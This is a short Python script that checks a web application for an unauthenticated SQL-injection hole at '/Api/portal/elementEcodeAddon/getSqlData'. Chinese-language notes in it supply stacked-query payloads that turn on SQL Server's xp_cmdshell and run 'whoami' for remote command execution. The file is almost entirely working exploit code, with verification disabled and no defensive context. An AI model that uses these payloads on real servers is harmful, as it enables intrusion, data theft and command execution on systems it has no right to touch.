

import requests

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def exp_check(url):
    try:
        payload = "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
        url = url
        rsp = requests.get(url+payload,headers=headers,verify=False)
        if rsp.status_code == 200 or "api_status" in rsp.text:
            return 1
        else:
            return 2
    except:
        return 3

def exp_others(url):
    try:
        url = url
        data = ("接口：\n"
                "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version\n"
                "如果是sqlServer 可以直接RCE\n"
                "payload 如下： POST请求\n"
                "api   :   /Api/portal/elementEcodeAddon/getSqlData/\n"
                "data:   ids=1);exec%20sp_configure%20%27show%20advanced%20options%27,%201;reconfigure;%20--( \n"
                "ids=1);exec%20sp_configure%20%27xp_cmdshell%27,1;reconfigure;%20--(\n"
                "ids=1);;exec%20xp_cmdshell%20%27whoami%27--("
                
        )
        return data
    except:
        return 3
   